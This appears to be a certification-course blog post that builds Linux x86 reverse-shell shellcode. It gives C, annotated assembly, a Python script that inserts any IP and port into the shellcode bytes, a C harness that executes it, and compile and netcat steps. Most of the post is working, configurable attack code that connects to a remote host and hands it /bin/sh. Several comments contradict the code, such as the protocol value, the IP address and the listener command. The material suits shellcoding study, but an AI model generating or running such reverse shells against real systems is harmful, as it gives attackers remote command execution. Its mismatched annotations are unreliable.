# Project 2: TCP Reverse Shell

## Task 

Create a Shell_Reverse_TCP shellcode
- Reverse connects to configured IP and Port 
- Execs shell on successful connection 

- IP and Port should be easily configurable

## Details

This assignment is similar to the previous of creating a bind shell, however, instead of opening a listening port it will connect back to the IP and port of our choosing upon execution of the shellcode. In Assignment 1 I went into great detail about how I get the syscall enumerator indices. In this assignment I will not go into such depth but rather focus on the shellcode itself.  

Since this shellcode will be executed on linux x86 which is a little endian architecture, we will convert all hex values (e.g. IP / port) into little endian when pushing them onto the stack.



# C Code

The C code equivalent of the final shellcode looks something like this:
```c
struct sockaddr_in sa;
    int s;
    //creating our struct
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    //first syscall socket
    s = socket(AF_INET, SOCK_STREAM, 0);

    //second syscall connect
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    //third syscall dup2
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    
    //final syscall execve
    execve("/bin/sh", 0, 0);
    return 0;
```

Note that unlike the previous assignment, there is no need to call bind() or accept(). 

# Assembly

To start, I will clear the registers I plan to use:

```x86asm
xor eax, eax
xor ebx, ebx
xor ecx, ecx
```

Next I must call [socket()](https://man7.org/linux/man-pages/man2/socket.2.html) which has this function deifinition:
```
int socket(int domain, int type, int protocol);
```

As explained in the last post, I must submit a syscall() with the socketcall() identifier of `0x66` in `eax` and a socketcall function index of `0x1` for the socket() function in `ebx` as the first argument.

```x86asm
	mov al, 0x66  		; syscall: int socketcall()
	mov bl, 0x1			; int socket()
```


I then push the arguments of socket() to the stack and move the stack pointer (pointer to the arguments) into the second parameter of the syscall function in `ecx`:

```x86asm
                    ; *args: push in reverse order to stack
push 0x6			; protocol: IPPROTO_TCP (2)
push 0x1			; type = SOCK_STREAM (1)
push 0x2			; domain = AF_INET (2)
mov ecx, esp
```

Since we are creating the same socket type (TCP) as in the bind shell exercise (assignment 1), I have left the details of these parameters out.

Next I call the syscall and move the return value (a pointer to the newly created socket) into the `edi` register:

```x86asm
int 0x80
mov edi, eax 		; store socket ptr to edi in edx
```

Next I must call the [connect()](https://man7.org/linux/man-pages/man2/connect.2.html) function. The difference between the bind shell exercise and this reverse shell is that we our address structure looks a little different. An IP address must be specified for the remote host we plan to connect to once the shellcode is executed. 

To accomplish this task, I first clear out registers `eax` and `ebx`.

Then I setup the syscall by loading `al` with `0x66` and `bl` with `0x3` to denote the connect() function.

Now I must place the address structure on the stack. Arguments are placed on the stack in reverse order.

As a reminder, this is the function definition for connect():
```c
int connect(int sockfd, const struct sockaddr *addr,
            socklen_t addrlen);
```

First I place the sockaddr struct on the stack. Since this is a TCP connection, the genaric sockaddr structure will be in sockaddr_in format. 

```c
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};
```

Pushing data to the stack in reverse order.

sin_zero can be ignored.

sin_addr = the hex value of an ip address. This can be done in a sript or online at [this website](https://www.browserling.com/tools/ip-to-hex). In this case, the reverse shell will connect to 10.0.2.15, or 0x0a00020f in hex (little endian). 

sin_port = hex value of the port in little endian. 

sin_family = AF_INET similar to the bind shell in assignment 1, this is used to identify the type of struct being used for the address and should be constant for all TCP connections.

Finally, once the sockaddr_in structure is built on the stack, we will get a pointer to the structure on the stack and temporarily place it in `ecx`.

The assembly for these operations is:
```x86asm
push 0x0a00020f		; IP = 10.10.10.3 (little endian)
push word 0x3905	; num = '1337' (little endian)
push word 0x02		; address family: AF_INET (2)
mov ecx, esp		; stack pointer to ecx
```

With the pointer to the structure, we will build the arguments for the connect() function. Again, keeping in mind the function definition:
```c
int connect(int sockfd, const struct sockaddr *addr,
            socklen_t addrlen);
```

First we push the length of the address struct, `0x10`.

Then push the pointer to the address structure we built, currently stored in `ecx`.

Then push the pointer to the open socket from before, currently stored in `edi`.

Finally, load the stack pointer into `ecx` to be used as the second argument in the socketcall() and execute the syscall():


```x86asm
push byte 0x10		; 
push ecx			; ptr to address struct
push edi			; ptr to socket from socket() call

mov ecx, esp		; load 2nd socketcall() argument into ecx
int 0x80
```

Now we will redirect the I/O from STDIN/STDOUT/STDERR to/from the socket using the [dup2()](https://man7.org/linux/man-pages/man2/dup.2.html) function. This is the same as the bind shell in assignment 1, so I will spare the explination here:

```x86asm
	; dup2
	mov ebx, edi		; mov file descriptor for socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:				
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)

```

Then, we call [execve()](https://man7.org/linux/man-pages/man2/execve.2.html) using "/bin/sh" as the path and two NULL values. This is the same set of operations from assignment 1, so again I will skip the explination.

```x86asm
; Execute /bin/sh
mov al, 0xb			; syscall: execve (11) int execve();

xor edx, edx		; envp (NULL)
push edx			; push 0x00 null terminator for string
push 0x68732f2f		; "hs//"   LITTLE ENDIAN
push 0x6e69622f 	; "nib/"


mov ebx, esp		; pathname: point ebx to stack
mov ecx, edx		; NULL

int 0x80			; execute execve
```

The full assembly looks like this:
```x86asm
	; Filename: reverse_shell.nasm

global _start

section .text
_start:

	; socket()
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov al, 0x66  		; syscall: int socketcall(int call, unsigned long *args)	;
	mov bl, 0x1			; int socket(int domain, int type, int protocol)	;

						; *args: push in reverse order to stack
	push 0x6			; protocol: IPPROTO_TCP (2)
	push 0x1			; type = SOCK_STREAM (1)
	push 0x2			; domain = AF_INET (2)
	mov ecx, esp
	int 0x80

	mov edi, eax 		; store socket ptr to edi in edx




	; connect()
	xor eax, eax
	xor ebx, ebx

	mov al, 0x66	    ; syscall: int socketcall(int call, unsigned long *args)	;
	mov bl, 0x3			; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

	push 0x030a0a0a		; IP = 10.10.10.3 (little endian)
	push word 0x3905	; num = '1337' (little endian)

	push word 0x02		; address family: AF_INET (2)

	mov ecx, esp		; stack pointer to ecx
	push byte 0x10		; 
	push ecx			; ptr to address struct
	push edi			; ptr to socket from socket() call

	mov ecx, esp		; 

	int 0x80




	; REDIRECT I/O
	; file descriptor : fd = (stdin = 0, stdout = 1, stderr = 2)
	; Will loop through all 3 file descriptors and redirct output to socket

	; dup2
	mov ebx, edi		; mov file descriptor for socket to ebx

	xor ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter (for loop)
	
loop:				
	mov al, 0x3f		; syscall: dup2 (63)  -- NOTE: eax was cleared above. Good to reduce # of instructions.
	int 0x80			; exec dup2
	dec ecx				; decrement counter
	jns loop			; jump until SF is set ; (jmp if positive)


	; Execute /bin/sh
	mov al, 0xb			; syscall: execve (11) int execve(const char *pathname, char *const argv[], char *const envp[]);

	xor edx, edx		; envp (NULL)
	push edx			; push 0x00 null terminator for string
	push 0x68732f2f		; "hs//"   LITTLE ENDIAN
	push 0x6e69622f 	; "nib/"


	mov ebx, esp		; pathname: point ebx to stack
	mov ecx, edx		; NULL

	int 0x80			; execute execve
```

# Python builder

The next part of the assignment is to create a python script that will accept an ip address and port, then create the shellcode dynamically.

We will build the assembly and extract the shellcode similarly to in assignment 1. 

Next a python script is prepared with the output of the shellcode, this time I replace the IP address and port and name the script `create_x86_reverse_shell.py`:

```python
#/bin/python3

import sys
import socket
import struct
import binascii

shellcode1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x03\\x68"
shellcode2 = "\\x66\\x68"
shellcode3 = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"


if not len(sys.argv) == 3:
    print(f"Usage: python3 {sys.argv[0]} <IPv4_adress> <port>")
    sys.exit()


address = sys.argv[1]
port = sys.argv[2]

address = binascii.hexlify(socket.inet_aton(address)).decode("utf-8") 
print(address)

address = f"\\x{address[:2]}\\x{address[2:4]}\\x{address[4:6]}\\x{address[6:8]}"
print(f"address: {address}")


port = struct.pack("!i", int(port)).hex()
port_byte1 = port[len(port)-4:len(port)-2]
port_byte2 = port[len(port)-2:]
port = f"\\x{port_byte1}\\x{port_byte2}"
print(f"port: {port}")

shellcode = shellcode1 + address + shellcode2 + port + shellcode3
print(shellcode)
```

Building the new shellcode can be done with the following command:

```bash
python3 create_x86_reverse_shell.py 0.0.0.0 1234
```

This is attempt to connect back to localhost, however, 0.0.0.0 can be replaced with a remote address as well.

The shellcode output can be placed into a file `template.c` for testing:

```c
#include <sys/mman.h>
#include <stdio.h>

unsigned char code[] = "\x31\xc0\x31\xdb\x31\xc9\xb0\x66\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x68\x00\x00\x00\x00\x66\x68\x00\x38\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80";

int main(){
  printf("Shellcode length: %d\n", strlen(code));
  int r =  mprotect((void *)((int)code & ~4095),  4096, PROT_READ | PROT_WRITE|PROT_EXEC);
  printf("mprotect: %d\n",r);
  int (*ret)() = (int(*)())code;
  return ret();
}

```

Which can be compiled using
```bash
gcc -fno-stack-protector -z execstack template.c -m32 -o reverse
```

Now a binary named `reverse` should exist. 

Create a listening port using netcat:
```
nc localhost 1234
```

And in another terminal, execute `./reverse`.

You should see the netcat listener receive a connection, from which you can run commands against /bin/sh.



# Certification Requirements

This blog post has been created for completing the requirements of the SecurityTube/PentesterAcademy [x86 Assembly Language and Shellcoding on Linux (SLAE)](https://www.pentesteracademy.com/course?id=3) certification:

Student ID: SLAE-alecjmaly
